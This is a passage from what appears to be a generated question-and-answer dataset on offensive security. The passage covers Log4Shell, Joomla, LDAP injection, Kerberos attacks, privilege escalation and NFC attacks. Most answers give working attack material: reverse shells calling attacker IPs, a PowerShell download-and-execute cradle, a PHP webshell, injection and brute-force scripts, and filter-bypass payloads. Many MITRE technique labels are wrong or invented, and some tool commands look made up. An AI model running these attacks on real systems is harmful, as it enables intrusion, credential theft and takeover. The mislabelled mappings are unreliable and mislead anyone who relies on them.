A: To exploit Log4Shell using Marshalsec, you can run the following commands:```java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"# Create a Java file named Exploit.java with the following content:public class Exploit {    static {        try {            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");        } catch (Exception e) {            e.printStackTrace();        }    }}```Compile the Exploit.java file, start an HTTP server in the directory containing the class file, and then trigger the exploit by sending the payload `${jndi:ldap://<LDAP_IP>:1389/Exploit}` to the vulnerable application. MITRE References: MITRE ID is T1211, MITRE Name is: JNDI Abuse, and MITRE Tactics are: TA0004, TA0009.

## Q: How can you use the JNDIExploit tool to exploit the Log4Shell vulnerability?
A: To use JNDIExploit to exploit Log4Shell, follow these steps:1. Download the JNDIExploit tool from the archived GitHub repository: `wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip`2. Unzip the downloaded file: `unzip JNDIExploit.v1.2.zip`3. Run the JNDIExploit tool with the following command to set up the LDAP and HTTP servers: `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888`4. To trigger a reverse shell, send the payload `${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}` to the vulnerable application.5. To execute a command, send the payload `${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}` to the vulnerable application. MITRE References: MITRE ID is T1211, MITRE Name is: JNDI Abuse, and MITRE Tactics are: TA0004, TA0009.

## Q: How can you use ysoserial and JNDI-Exploit-Kit to exploit the Log4Shell vulnerability?
A: To exploit Log4Shell using ysoserial and JNDI-Exploit-Kit, follow these steps:1. Generate a deserialization payload using ysoserial or ysoserial-modified:   ```   java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser   ```2. Use JNDI-Exploit-Kit to set up the JNDI link that will serve the deserialization payload:   ```   java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser   ```3. Send the payload `${ldap://10.10.14.10:1389/generated}` to the vulnerable application to trigger the exploit and obtain a reverse shell. MITRE References: MITRE ID is T1211, MITRE Name is: JNDI Abuse, and MITRE Tactics are: TA0004, TA0009.

## Q: What are some techniques for bypassing Log4Shell mitigations?
A: Some techniques for bypassing Log4Shell mitigations include:- Using environment variable substitution: `${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}`- Using mixed case and unicode characters: `${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}`- Leveraging different protocol lookups like `${${::-j}ndi:rmi://attackerendpoint.com/}` or `${${::-j}ndi:dns://attackerendpoint.com/}` MITRE References: MITRE ID is T1211, MITRE Name is: JNDI Abuse, and MITRE Tactics are: TA0004, TA0009.

## Q: How can you use conversion patterns and regular expressions in Log4j to exfiltrate data?
A: You can use Log4j's conversion patterns and regular expressions to exfiltrate data in the following ways:1. **Binary Search via Exception Messages**:   ```   %replace{${env:FLAG}}{^CTF.*}{${error}}   ```   This payload will trigger an exception if the `env:FLAG` contains the string `CTF`, allowing you to detect the presence of the flag.2. **Time-based Exfiltration**:   ```   %replace{${env:FLAG}}{^(?=CTF)((.*)*)salt$}{asd}   ```   This payload uses a regular expression that will cause a timeout if the `env:FLAG` starts with `CTF`, allowing you to determine the flag character-by-character. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you use the Joomla API to get unauthenticated information disclosure?
A: Versions from 4.0.0 to 4.2.7 are vulnerable to Unauthenticated information disclosure (CVE-2023-23752) that will dump credentials and other information. You can use the following API endpoints to get this information:

- Users: `http://<host>/api/v1/users?public=true`
- Config File: `http://<host>/api/index.php/v1/config/application?public=true`

You can also use the Metasploit module `scanner/http/joomla_api_improper_access_checks` or the ruby script [51334](https://www.exploit-db.com/exploits/51334) to exploit this vulnerability. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you brute-force the Joomla login?
A: You can use this [script](https://github.com/ajnik/joomla-brute-force) to attempt to brute-force the Joomla login:

```sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin```This will try to log in as the 'admin' user using a wordlist of common passwords. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you get RCE in Joomla after gaining admin credentials?
A: If you manage to get admin credentials for Joomla, you can achieve RCE by adding a snippet of PHP code to a template. Here's how:

1. Go to the 'Templates' section in the Joomla admin panel.
2. Select a template, like 'protostar'.
3. Choose the 'error.php' file and add the following PHP one-liner to gain code execution: `system($_GET['cmd']);`
4. Save and close the file.
5. You can now execute commands by visiting the URL: `http://joomla-site.local/templates/protostar/error.php?cmd=id` MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can the jsql-injection tool be used to perform SQL injection attacks?
A: The jsql-injection tool can be used to automate the process of finding and exploiting SQL injection vulnerabilities. It supports 33 different database engines and provides multiple injection strategies including normal, stacked, error, blind, and time-based injection. The tool can be used to fingerprint the database, read and write files, and even create web and SQL shells on the target system. Version 0.95 of jsql-injection includes these capabilities. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: What techniques can be used to bypass input validation and execute arbitrary SQL queries using jsql-injection?
A: The jsql-injection tool supports various injection techniques that can be used to bypass input validation and execute arbitrary SQL queries. This includes using the 'Stacked' injection strategy to execute multiple SQL statements, the 'Error' injection strategy to extract information from error messages, and the 'Blind' and 'Time' strategies to perform Boolean-based and time-based blind SQL injection attacks. The tool also provides options to tamper with the injected payloads to evade detection. MITRE References: MITRE ID is T1564, MITRE Name is: Hide Artifacts, and MITRE Tactics are: Defense Evasion.

## Q: How can you use JavaScript hoisting to bypass security checks and execute injected code?
A: In a scenario where there is a security check that verifies if a 'config' variable is defined before executing some code, you can leverage JavaScript hoisting to bypass this check and execute injected code:

try {
    if(config){
      return;
    }
    // TODO handle missing config for: https://try-to-catch.glitch.me/
let config;`-alert(1)`//`
  } catch {
    fetch("/error", {
      method: "POST",
      body: {
        url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
      }
    })
  }

By injecting `let config;`-alert(1)`//`, the 'config' variable is declared but left empty, bypassing the security check and allowing the injected code to execute. MITRE References: MITRE ID is T1556.003, MITRE Name is: Modify Authentication Process: SSO Abuse, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you launch a Powershell reverse shell using JuicyPotato?
A: To launch a Powershell reverse shell using JuicyPotato, you can run the following command:

```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

This will download and execute a Powershell script from the attacker's machine. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can Kali Linux's Aircrack-ng suite be used to crack WEP and WPA2 wireless network passwords?
A: Aircrack-ng is a suite of tools for auditing wireless networks and cracking WEP and WPA2 passwords. To crack a WEP-encrypted network, you can use the `aircrack-ng` command to capture and analyze network traffic to recover the WEP key. For WPA2, you can use `aircrack-ng` along with `airmon-ng` and `airodump-ng` to capture the handshake and then crack the password using a dictionary attack or bruteforce. Aircrack-ng version 1.6 is included in Kali Linux. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: TA0006, Lateral Movement.

## Q: How to crack the Kerberoast hashes?
A: ```john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoasthashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi``` MITRE References: MITRE ID is T1110.001, MITRE Name is: Brute Force: Password Guessing, and MITRE Tactics are: CredentialAccess.

## Q: How to perform Kerberoasting without a domain account?
A: #### Linux
* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows
* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
``` MITRE References: MITRE ID is T1558.003, MITRE Name is: Kerberoasting, and MITRE Tactics are: CredentialAccess.

## Q: How can you perform Kerberoasting attacks?
A: Kerberoasting is a technique where an attacker requests a service ticket for a target account, and then attempts to crack the service account's password hash. This can be done using tools like Rubeus or Impacket's GetUserSPNs.py. The attacker can then use the cracked password to gain access to the target account. MITRE References: MITRE ID is T1208, MITRE Name is: Kerberoasting, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform a Kerberos Golden Ticket attack?
A: A Kerberos Golden Ticket attack involves forging a Ticket-Granting Ticket (TGT) for the KRBTGT account, which has the highest level of privileges in an Active Directory environment. This allows the attacker to generate service tickets for any user or service, effectively giving them full control over the domain. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberos Ticket Exploitation, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform a Kerberos Silver Ticket attack?
A: A Kerberos Silver Ticket attack involves forging a service ticket for a specific service account, rather than a TGT for the KRBTGT account. This allows the attacker to gain access to the targeted service, bypassing any additional authentication or authorization checks. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberos Ticket Exploitation, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can Koadic be used to establish a secure, encrypted communication channel with a compromised Windows host?
A: Koadic version 0~git20210412-0kali4 supports establishing a cryptographically secure communication channel with a compromised Windows host using SSL/TLS. This can be achieved by using the `stager/js/reverse_https` or `stager/js/reverse_http_client` modules, which will generate and deliver a payload that connects back to the Koadic C2 server over an encrypted channel. This allows for stealth and persistence, as the communication can blend in with normal HTTPS/HTTP traffic on the target system. MITRE References: MITRE ID is T1071, MITRE Name is: Application Layer Protocol, and MITRE Tactics are: Command and Control.

## Q: How can Koadic be used to gather system information from a compromised Windows host?
A: Koadic version 0~git20210412-0kali4 provides several modules that can be used to gather various types of system information from a compromised Windows host. For example, the `collect/system_info` module can be used to retrieve information such as the operating system version, installed applications, running processes, and network connections. Additionally, the `collect/user_accounts` module can be used to enumerate user accounts on the target system. These capabilities can be leveraged during post-exploitation activities to gain a better understanding of the compromised environment. MITRE References: MITRE ID is T1033, MITRE Name is: System Owner/User Discovery, and MITRE Tactics are: Discovery.

## Q: How can Helm be used to deploy malicious or vulnerable Kubernetes applications?
A: Helm can be used to deploy malicious or vulnerable Kubernetes applications by creating or modifying Helm charts. A malicious Helm chart could include insecure configurations, vulnerable software, or even malicious code that gets executed when the chart is deployed. Attackers could also try to find and exploit vulnerabilities in the Helm client or server-side components to gain access or execute arbitrary code. MITRE References: MITRE ID is T1222, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007, Initial Access.

## Q: How can kustomize be used to deploy a Kubernetes backdoor?
A: Kustomize version 5.3.0 could potentially be used to deploy a malicious container image as a Kubernetes deployment or DaemonSet, effectively creating a backdoor in the cluster. This could be done by modifying the kustomization.yaml file to reference a malicious container image. This would exploit the 'Deploy Container' (T1598) tactic in the MITRE ATT&CK framework. MITRE References: MITRE ID is T1598, MITRE Name is: Deploy Container, and MITRE Tactics are: Command and Control.

## Q: How can you exploit the Laravel Deserialization RCE vulnerability?
A: Vulnerable versions: 5.5.40 and 5.6.x through 5.6.29 (<https://www.cvedetails.com/cve/CVE-2018-15133/>)

You can find information about the deserialization vulnerability here: <https://labs.withsecure.com/archive/laravel-cookie-forgery-decryption-and-rce/>

You can test and exploit it using <https://github.com/kozmic/laravel-poc-CVE-2018-15133>
Or you can also exploit it with metasploit: `use unix/http/laravel_token_unserialize_exec` MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0002.

## Q: How can you exploit the CVE-2021-3129 vulnerability in Laravel?
A: Another deserialization: <https://github.com/ambionics/laravel-exploits> MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: TA0002.

## Q: How can you exploit SQL Injection vulnerabilities in Laravel?
A: Read information about this here: <https://stitcher.io/blog/unsafe-sql-functions-in-laravel> MITRE References: MITRE ID is T1564, MITRE Name is: Hide Artifacts, and MITRE Tactics are: TA0005.

## Q: How can PsExec be used for lateral movement?
A: PsExec is a tool that allows executing commands on remote systems. It can be used to execute commands on other systems if you have the right credentials. You can use `PsExec \\REMOTEHOST -i -s cmd.exe` to open a system shell on the remote host. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: TA0008.

## Q: How can you bypass LDAP login using injection?
A: LDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed. Some example payloads for bypassing LDAP login include:

- `user=*&password=*` (using asterisks as wildcards)
- `user=*)(&&password=*)(&` 
- `user=*)(|(&& pass=pwd)`
- `user=*)(|(password=* & password=test)`
- `user=*))%00 & pass=any` (using null byte to terminate the query)
- `username=admin)(&)& password=pwd` (can throw an error) MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you perform Blind LDAP Injection without using the "*" wildcard?
A: You can perform Blind LDAP Injection without using the "*" wildcard by iterating over the alphabet characters instead:```python#!/usr/bin/python3import requests, stringalphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"flag = ""for i in range(50):    print("[i] Looking for number " + str(i))    for char in alphabet:        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)        if ("TRUE CONDITION" in r.text):            flag += char            print("[+] Flag: " + flag)            break```This script will brute-force the password character by character without using the "*" wildcard. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How do you compile the library for the shared vulnerability exploit?
A: To compile the library for the shared vulnerability exploit, follow these steps:

1. Create the `libcustom.c` file with the vulnerable code.
2. Compile the library: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. Copy `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs) MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, Privilege Escalation.

## Q: How do you create the malicious library for the ld.so privesc exploit?
A: To create the malicious library for the ld.so privesc exploit, follow these steps:

1. Create a file in `/home/ubuntu/lib/libcustom.c` with the malicious code.
2. Compile the malicious library: `gcc -shared -o libcustom.so -fPIC libcustom.c`. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, Privilege Escalation.

## Q: How do you trigger the ld.so privesc exploit?
A: To trigger the ld.so privesc exploit, follow these steps:

1. Create a malicious configuration file in `/etc/ld.so.conf.d/privesc.conf` with the path to the malicious library: `echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf`.
2. Wait for a reboot or run `ldconfig` as root to load the malicious library.
3. Run the `sharedvuln` binary to execute the malicious code with root privileges. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, Privilege Escalation.

## Q: How do you exploit the ld.so privesc vulnerability if you have sudo privileges on ldconfig?
A: To exploit the ld.so privesc vulnerability if you have sudo privileges on ldconfig, follow these steps:

1. Create a fake ld.so.conf file in `/tmp/fake.ld.so.conf` with the line `include /tmp/conf/*`.
2. Create a malicious configuration file in `/tmp/conf/evil.conf` with the path to the malicious library: `echo "/tmp" > /tmp/conf/evil.conf`.
3. Run `ldconfig -f /tmp/fake.ld.so.conf` to load the malicious library from `/tmp`.
4. Run the `sharedvuln` binary to execute the malicious code with root privileges. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, Privilege Escalation.

## Q: What MITRE attack matrix technique can be used to bypass authentication mechanisms on a web application?
A: The MITRE ATT&CK technique 'Brute Force' (T1110) can be used to bypass authentication mechanisms on a web application. This involves systematically checking all possible passwords until the correct one is found. Tools like Hydra, Burp Suite, and Metasploit can automate the brute-force process against web login pages. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you use the LeakedHandlesFinder tool to monitor and autoexploit leaked handles?
A: [LeakedHandlesFinder](https://github.com/lab52io/LeakedHandlesFinder) allows you to monitor leaked handles and even autoexploit them to escalate privileges. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a leaked process handle to escalate privileges?
A: If an unprivileged process inherits a process handle of a privileged process with enough permissions (like PROCESS_ALL_ACCESS, PROCESS_CREATE_PROCESS, PROCESS_CREATE_THREAD, etc.), it will be able to execute arbitrary code on the privileged process. You can use this to escalate privileges. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a leaked thread handle to escalate privileges?
A: Similar to a leaked process handle, if an unprivileged process inherits a thread handle of a privileged process with enough permissions (like THREAD_ALL_ACCESS, THREAD_DIRECT_IMPERSONATION, THREAD_SET_CONTEXT), it will be able to execute arbitrary code on the privileged thread. You can use this to escalate privileges. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a leaked file, key, or section handle to escalate privileges?
A: If an unprivileged process inherits a handle with write equivalent permissions over a privileged file or registry, it will be able to overwrite the file/registry and potentially escalate privileges. Section Handles are similar to file handles and can also be exploited in a similar way. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can the second exploit example use the leaked privileged process handle to create a new elevated command prompt process?
A: The second exploit example uses the `UpdateProcThreadAttribute` function with the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute and the handle to the open privileged process. This allows the newly created command prompt process to inherit the token privilege of the privileged process, effectively escalating the privileges of the low-privileged process. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: How can I use Legion to perform reconnaissance on a target system?
A: To perform reconnaissance with Legion, you can use the 'discover' module. This will allow you to scan the target for open ports, running services, and vulnerabilities. For example, to scan a target IP address 192.168.1.100, you can run the following command in Legion v0.4.3:

root@kali:~$ legion discover 192.168.1.100

This will perform a comprehensive scan and display the results in the Legion GUI. The reconnaissance data can then be used to plan further steps in the penetration test. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Reconnaissance.

## Q: How can I use Legion to exploit vulnerabilities on a target system?
A: To exploit vulnerabilities using Legion v0.4.3, you can use the 'exploit' module. After performing reconnaissance, Legion will identify potential vulnerabilities on the target system. You can then select the appropriate exploit from the list and run it against the target. For example, if Legion identifies a vulnerable Apache Struts instance, you can select the corresponding exploit and launch it with the following command:

root@kali:~$ legion exploit 192.168.1.100 apache_struts_rce

This will attempt to exploit the vulnerability and gain access to the target system. The exploit module in Legion provides a user-friendly interface to streamline the exploitation process. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you improve the PHP-FPM configuration to generate more temporary files and speed up the brute-force process?
A: If the web page is using **PHP-FMP**, there is something else that can be done to improve the technique. PHP-FMP allow to **configure** the **parameter** `**request_terminate_timeout**` in `**/etc/php/<php-version>/fpm/pool.d/www.conf**`. This parameter indicates the maximum amount of seconds **when** **request to PHP must terminate** (infinite by default, but **30s if the param is uncommented**). When a request is being processed by PHP the indicated number of seconds, it's **killed**. This means, that if the request was uploading temporary files, because the **php processing was stopped**, those **files aren't going to be deleted**. Therefore, if you can make a request last that time, you can **generate thousands of temporary files** that won't be deleted, which will **speed up the process of finding them** and reduces the probability of a DoS to the platform by consuming all connections. MITRE References: MITRE ID is T1490, MITRE Name is: Inhibit System Recovery, and MITRE Tactics are: Impact.

## Q: What steps are needed to exploit the LFI2RCE via phpinfo() vulnerability?
A: To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, "file_uploads = on" and the server has to be able to write in the "/tmp" directory. You need to fix the exploit (change => for =&gt) by running the following command:

```
sed -i 's/\[tmp_name\] \=>/ \[tmp_name\] =\>/ g' phpinfolfi.py
```
You have to change also the payload at the beginning of the exploit (for a php-rev-shell for example), the REQ1 (this should point to the phpinfo page and should have the padding included), and LFIREQ (this should point to the LFI vulnerability). MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you bruteforce the name of the temporary file created in a Linux system to exploit the LFI2RCE via phpinfo() vulnerability?
A: In Linux, the name of the file is usually random and located in /tmp. As the name is random, it is needed to extract from somewhere the name of the temporal file and access it before it is deleted. This can be done reading the value of the variable $_FILES inside the content of the function "phpconfig()".

You can use the following Python script to try to bruteforce the name (if length = 6):

```pythonimport itertoolsimport requestsimport sysprint('[+] Trying to win the race')f = {'file': open('shell.php', 'rb')}for _ in range(4096 * 4096):    requests.post('http://target.com/index.php?c=index.php', f)print('[+] Bruteforcing the inclusion')for fname in itertools.combinations(string.ascii_letters + string.digits, 6):    url = 'http://target.com/index.php?c=/tmp/php' + fname    r = requests.get(url)    if 'load average' in r.text:  # <?php echo system('uptime');        print('[+] We have got a shell: ' + url)        sys.exit(0)print('[x] Something went wrong, please try again')``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What are some automatic tools available to generate php://filter payloads?
A: The content mentions two automatic tools that can generate php://filter payloads:

1. https://github.com/synacktiv/php_filter_chain_generator
2. https://github.com/ambionics/wrapwrap (can add suffixes) MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can libfreefare be used to format a Mifare DESFire card?
A: The `mifare-desfire-format` tool from the libfreefare-bin package can be used to format a Mifare DESFire card. To use it, run the following command:

```
root@kali:~# mifare-desfire-format -y
```

This will format the card without prompting for confirmation. The `-K` option can be used to provide a custom PICC key. MITRE References: MITRE ID is T1492, MITRE Name is: Stored Data Manipulation, and MITRE Tactics are: Impact.

## Q: How can nfc-mfclassic be used to read and write MIFARE Classic cards in an unauthorized manner?
A: The nfc-mfclassic tool from libnfc version 1.8.0 can be used to read and write MIFARE Classic cards without authentication. The 'unlocked read' (-R) and 'unlocked write' (-W) options allow accessing the card's data and keys without knowing the correct authentication keys. This can be useful for penetration testing or CTF events involving MIFARE Classic cards, but should be used with caution as it can lead to unauthorized access. MITRE References: MITRE ID is T1189, MITRE Name is: Drive-by Compromise, and MITRE Tactics are: Initial Access, Privilege Escalation.

## Q: How can nfc-relay-picc be used to demonstrate a relay attack on ISO 14443-4 devices?
A: The nfc-relay-picc tool from libnfc version 1.8.0 can be used to demonstrate a relay attack on ISO 14443-4 devices. This tool allows relaying data between an NFC initiator and a target, simulating a man-in-the-middle attack. By adding a delay (-n option) it can be used to show how a remote relay attack works on proximity-based authentication systems. This can be a useful technique for security assessments or CTF events involving NFC technology. MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Lateral Movement, Credential Access.

## Q: What is the recommended command to obtain a full TTY reverse shell?
A: Once you get a reverse shell, read this page to obtain a full TTY: https://explainshell.com/ MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you use the 'whois' and 'finger' commands to establish a reverse shell?
A: The 'whois' and 'finger' commands can be used to establish a reverse shell by embedding the command to be executed in the output of these commands. The attacker can then listen for the command output and execute it. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you escalate privileges by abusing the CAP_SYS_ADMIN capability?
A: The CAP_SYS_ADMIN capability is highly potent and can be used to perform various administrative tasks, such as mounting devices or manipulating kernel features. This capability can be exploited to bypass file permissions, modify the kernel, and potentially achieve privilege escalation. For example, you could use the CAP_SYS_ADMIN capability to mount a modified `passwd` file over the real `passwd` file and then `su` as root using the modified password. MITRE References: MITRE ID is T1548.004, MITRE Name is: Abuse Elevation Control Mechanism: Elevated Execution with Shared Modules, and MITRE Tactics are: Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SYS_MODULE capability?
A: The CAP_SYS_MODULE capability empowers a process to load and unload kernel modules, offering direct access to the kernel's core operations. This capability presents critical security risks, as it enables privilege escalation and total system compromise by allowing modifications to the kernel, thereby bypassing all Linux security mechanisms, including Linux Security Modules and container isolation. You can abuse this capability to insert or remove kernel modules in/from the kernel of the host machine. MITRE References: MITRE ID is T1547.006, MITRE Name is: Boot or Logon Autostart Execution: Kernel Modules and Extensions, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_DAC_READ_SEARCH capability?
A: The CAP_DAC_READ_SEARCH capability enables a process to bypass permissions for reading files and for reading and executing directories. This can be exploited to access sensitive files, such as `/etc/shadow`, that would normally be restricted. Additionally, it allows the use of `open_by_handle_at(2)` to access any file, including those outside the process's mount namespace. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access, Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_DAC_OVERRIDE capability?
A: The CAP_DAC_OVERRIDE capability allows a process to bypass write permission checks on any file. This means you can overwrite critical system files, such as `/etc/passwd`, `/etc/sudoers`, or `/etc/shadow`, to escalate privileges. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access, Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_CHOWN capability?
A: The CAP_CHOWN capability allows a process to change the ownership of any file. This can be used to change the ownership of sensitive files, such as `/etc/shadow`, and then modify the contents to escalate privileges. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access, Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SETFCAP capability?
A: The CAP_SETFCAP capability allows a process to set capabilities on files and processes. This can be used to grant additional capabilities to a binary, such as CAP_SETUID, which can then be used to escalate privileges. MITRE References: MITRE ID is T1548.003, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_NET_BIND_SERVICE capability?
A: The CAP_NET_BIND_SERVICE capability allows a process to listen on any port, even privileged ports. While this does not directly lead to privilege escalation, it may be useful in certain scenarios, such as bypassing network access controls or enabling further exploitation. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you escalate privileges by abusing the CAP_NET_RAW capability?
A: The CAP_NET_RAW capability allows a process to create raw and packet sockets, enabling the generation and sending of arbitrary network packets. This can be used for packet spoofing, traffic injection, and bypassing network access controls, but does not directly lead to privilege escalation. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you escalate privileges by abusing the CAP_NET_ADMIN capability?
A: The CAP_NET_ADMIN capability grants the holder the power to alter network configurations, including firewall settings, routing tables, socket permissions, and network interface settings within the exposed network namespaces. This can be used to bypass network security measures, but does not directly lead to privilege escalation. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you escalate privileges by abusing the CAP_LINUX_IMMUTABLE capability?
A: The CAP_LINUX_IMMUTABLE capability allows a process to modify inode attributes, such as the immutable attribute. This can be used to make a file modifiable, which may potentially lead to privilege escalation if the file contains sensitive information that can be exploited. MITRE References: MITRE ID is T1222.001, MITRE Name is: File and Directory Permissions Modification: Modify File Permissions, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SYS_CHROOT capability?
A: The CAP_SYS_CHROOT capability enables the execution of the `chroot(2)` system call, which can potentially allow for the escape from `chroot(2)` environments through known vulnerabilities. This can be used to break out of restricted environments and potentially escalate privileges. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SYS_BOOT capability?
A: The CAP_SYS_BOOT capability allows the execution of the `reboot(2)` system call for system restarts, including specific commands like `LINUX_REBOOT_CMD_RESTART2` tailored for certain hardware platforms. It also enables the use of `kexec_load(2)` and `kexec_file_load(2)` for loading new or signed crash kernels. This capability can potentially be abused for privilege escalation, but the specific attack vectors depend on the system configuration and kernel version. MITRE References: MITRE ID is T1574.008, MITRE Name is: Hijack Execution Flow: Interrupt Handling, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SYSLOG capability?
